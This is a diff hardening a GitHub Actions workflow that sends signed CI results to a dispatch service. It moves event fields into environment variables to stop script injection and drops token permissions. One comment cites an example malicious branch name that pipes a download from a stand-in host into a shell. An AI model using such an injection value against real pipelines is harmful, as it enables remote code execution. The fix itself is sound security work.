@@ -5,34 +5,45 @@ on:
     types: [completed]
     branches: [main]
 
+# Least privilege: the token gets nothing by default; each job asks only for what it needs.
 permissions: {}
 
 jobs:
   notify:
+    permissions: {}
     runs-on: ubuntu-latest
     steps:
       - name: Emit CI result to garcar-dispatch
         env:
           DISPATCH_URL: ${{ secrets.DISPATCH_URL }}
           DISPATCH_SECRET: ${{ secrets.DISPATCH_SECRET }}
+          # Event data goes through env, never pasted into the script: a branch
+          # name like  $(curl evil|sh)  must stay plain text.
+          REPO: ${{ github.repository }}
+          RUN_CONCLUSION: ${{ github.event.workflow_run.conclusion }}
+          RUN_ID: ${{ github.event.workflow_run.id }}
+          RUN_HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
+          RUN_HEAD_SHA: ${{ github.event.workflow_run.head_sha }}
+          RUN_NAME: ${{ github.event.workflow_run.name }}
+          RUN_ACTOR: ${{ github.event.workflow_run.triggering_actor.login }}
         run: |
           if [ -z "$DISPATCH_URL" ]; then
             echo "DISPATCH_URL not set — skipping"
             exit 0
           fi
-          CONCLUSION="${{ github.event.workflow_run.conclusion }}"
+          CONCLUSION="$RUN_CONCLUSION"
           EVENT_TYPE="github.ci_${CONCLUSION}"
-          RUN_URL="https://github.com/${{ github.repository }}/actions/runs/${{ github.event.workflow_run.id }}"
+          RUN_URL="https://github.com/$REPO/actions/runs/$RUN_ID"
           BODY=$(printf '{"event_type":"%s","source_system":"github-actions","status":"%s","repo":"%s","branch":"%s","run_url":"%s","commit_sha":"%s","payload":{"workflow":"%s","run_id":"%s","actor":"%s"}}' \
             "$EVENT_TYPE" \
             "$CONCLUSION" \
-            "${{ github.repository }}" \
-            "${{ github.event.workflow_run.head_branch }}" \
+            "$REPO" \
+            "$RUN_HEAD_BRANCH" \
             "$RUN_URL" \
-            "${{ github.event.workflow_run.head_sha }}" \
-            "${{ github.event.workflow_run.name }}" \
-            "${{ github.event.workflow_run.id }}" \
-            "${{ github.event.workflow_run.triggering_actor.login }}")
+            "$RUN_HEAD_SHA" \
+            "$RUN_NAME" \
+            "$RUN_ID" \
+            "$RUN_ACTOR")
           SIG=$(printf '%s' "$BODY" | openssl dgst -sha256 -hmac "${DISPATCH_SECRET:-placeholder}" -hex | awk '{print $2}')
           curl -sf -X POST "$DISPATCH_URL/dispatch" \
             -H "Content-Type: application/json" \
